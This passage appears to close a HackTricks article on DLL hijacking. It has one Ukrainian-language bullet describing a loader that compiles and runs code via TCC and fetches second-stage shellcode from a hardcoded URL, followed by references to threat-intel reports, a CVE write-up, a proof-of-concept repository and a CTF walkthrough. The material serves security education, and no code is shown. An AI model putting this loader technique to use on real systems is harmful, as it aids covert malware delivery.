- Цей TCC-based compile-and-run етап імпортував `Wininet.dll` під час виконання та витягнув second-stage shellcode з hardcoded URL, забезпечивши гнучкий loader, який маскується під compiler run.

## Посилання

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
